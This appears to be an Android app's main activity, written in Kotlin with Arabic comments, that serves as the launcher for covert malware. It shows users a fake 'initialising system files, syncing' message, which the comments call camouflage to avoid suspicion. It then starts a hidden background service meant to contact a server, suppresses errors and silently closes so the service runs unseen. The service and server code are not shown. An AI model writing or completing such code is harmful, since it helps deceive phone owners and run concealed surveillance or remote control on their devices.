package com.assets.service

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import android.view.Gravity

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // بناء نص تمويهي بسيط يظهر للمستخدم عند الضغط لتجنب شكوك النظام
        val textView = TextView(this).apply {
            text = "جاري تهيئة ملفات النظام المستقرة...\nيرجى الانتظار لحين اكتمال المزامنة."
            gravity = Gravity.CENTER
            textSize = 18f
        }
        setContentView(textView)

        try {
            // تشغيل الخدمة الخلفية الشبحية للاتصال بالخادم
            val serviceIntent = Intent(this, SyncService::class.java)
            startService(serviceIntent)
        } catch (e: Exception) {}

        // انتهاء الواجهة صامتاً بعد ثوانٍ معدودة لتستمر الخدمة بالعمل في الخلفية كلياً
        textView.postDelayed({
            finish()
        }, 1500) 
    }
}
